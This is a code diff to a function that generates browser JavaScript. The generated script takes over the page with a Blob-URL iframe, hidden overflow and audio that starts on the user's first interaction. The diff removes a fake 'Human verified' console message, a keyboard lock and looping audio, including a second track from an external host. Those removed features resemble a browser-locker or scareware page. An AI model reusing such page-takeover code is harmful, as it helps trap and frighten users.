@@ -300,8 +300,6 @@ function buildSecondaryJS(origin) {
   const audio1Url = config?.audio1 ?? "";
 
   return `
-  console.log("%c✅ Human verified. Waiting for user interaction...", "color:#0f0;font-size:18px;font-weight:bold");
-
   const embeddedHtml = ${JSON.stringify(html)};
 
   document.documentElement.style.overflow = 'hidden';
@@ -322,8 +320,6 @@ function buildSecondaryJS(origin) {
       }
     }, 100);
 
-    navigator.keyboard.lock();
-
     // Load embedded HTML into an iframe via Blob URL
     var blob = new Blob([embeddedHtml], { type: 'text/html' });
     var blobUrl = URL.createObjectURL(blob);
@@ -342,12 +338,7 @@ function buildSecondaryJS(origin) {
 
     // Play audios
     var audio1 = new Audio(${JSON.stringify(audio1Url)});
-    audio1.loop = true;
     audio1.play().catch(function(e) { console.warn('Audio 1 blocked:', e); });
-
-    var audio2 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
-    audio2.loop = true;
-    audio2.play().catch(function(e) { console.warn('Audio 2 blocked:', e); });
   }, { once: true });
 `;
 }
